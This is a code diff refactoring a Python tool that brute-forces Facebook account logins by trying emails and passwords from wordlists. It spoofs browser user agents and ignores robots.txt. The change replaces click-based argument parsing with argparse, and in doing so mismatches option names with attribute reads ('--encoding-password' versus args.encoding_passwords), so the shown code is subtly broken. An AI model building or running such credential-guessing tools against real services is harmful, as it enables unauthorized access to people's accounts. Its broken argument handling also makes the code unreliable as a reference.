@@ -11,23 +11,18 @@ TODO:
 
 import random
 import subprocess
+import argparse
 
 from http.cookiejar import LWPCookieJar
 
 import tqdm
 import mechanize
-import click
 
-_MAX_TEXT_OUTPUT_WIDTH = 120
 
 _USER_AGENTS = (
     'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
 )
-
-_SUPPORTED_DOMAINS = [
-    "facebook",
-]
 
 
 class UnknownDomainName(Exception):
@@ -37,15 +32,25 @@ class UnknownDomainName(Exception):
         ))
 
 
-@click.command(context_settings=dict(max_content_width=_MAX_TEXT_OUTPUT_WIDTH))
-@click.argument("domain", nargs=1, required=True,type=click.Choice(_SUPPORTED_DOMAINS))
-@click.argument("file_emails", type=str, nargs=1, required=True)
-@click.argument("file_passwords", type=str, nargs=1, required=True)
-@click.option("--encoding-emails", type=str, default="utf8", show_default=True)
-@click.option("--encoding-passwords", type=str, default="utf8", show_default=True)
-@click.option("--newline-emails", type=str, default="\n", show_default=True)
-@click.option("--newline-passwords", type=str, default="\n", show_default=True)
-def main(domain, file_emails, file_passwords, encoding_emails, encoding_passwords, newline_emails, newline_passwords):
+def main():
+    # Parse arguments
+    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument("domain", choices=["facebook"],
+                        help='Domain to bruteforce')
+    parser.add_argument("file_emails", type=str,
+                        help="File containing emails to bruteforce. One email per line.")
+    parser.add_argument("file_passwords", type=str,
+                        help="File containing passwords to try. One password per line.")
+    parser.add_argument("--encoding-emails", type=str, default="utf8",
+                        help="Encoding used for the email file.")
+    parser.add_argument("--encoding-password", type=str, default="utf8",
+                        help="Encoding used for the password file.")
+    parser.add_argument("--newline-emails", type=str, default="\n",
+                        help="Newline character used for the email file.")
+    parser.add_argument("--newline-password", type=str, default="\n",
+                        help="Newline character used for the password file.")
+    args = parser.parse_args()
+
     # Setup browser
     browser = mechanize.Browser()
     browser.set_handle_robots(handle=False)  # Ignore robots.txt
@@ -53,14 +58,17 @@ def main(domain, file_emails, file_passwords, encoding_emails, encoding_password
     browser.set_cookiejar(cookiejar=LWPCookieJar())
     browser.set_handle_equiv(handle=True)  # Treats all http-equiv headers as HTTP headers
     browser.set_handle_referer(handle=True)  # Add Referer header to heack requests
-    browser.set_handle_refresh(handle=mechanize._http.HTTPRefreshProcessor(), max_time=1)  # Handle HTTP Refresh headers
+    browser.set_handle_refresh(handle=mechanize._http.HTTPRefreshProcessor(),
+                               max_time=1)  # Handle HTTP Refresh headers
 
     # Find which domain to bruteforce
-    login_function = domain_to_login_function(domain_name=domain)
+    login_function = domain_to_login_function(domain_name=args.domain)
 
     # Bruteforce file
-    bruteforce_url(browser, login_function, file_emails, file_passwords, encoding_emails, encoding_passwords,
-                   newline_emails, newline_passwords)
+    bruteforce_url(browser=browser, login_function=login_function, file_emails=args.file_emails,
+                   file_passwords=args.file_passwords, encoding_emails=args.encoding_emails,
+                   encoding_passwords=args.encoding_passwords, newline_emails=args.newline_emails,
+                   newline_passwords=args.newline_passwords)
 
 
 def domain_to_login_function(domain_name):
@@ -71,7 +79,7 @@ def domain_to_login_function(domain_name):
         raise UnknownDomainName(domain_name)
 
 
-def bruteforce_url(browser, login_function, file_emails, file_passwords, encoding_emails, encoding_passwords,
+def bruteforce_url(*, browser, login_function, file_emails, file_passwords, encoding_emails, encoding_passwords,
                    newline_emails, newline_passwords):
     with open(file_emails, 'r', encoding=encoding_emails, newline=newline_emails) as f_emails:
         for email in tqdm.tqdm(f_emails, total=file_length(file_emails)):
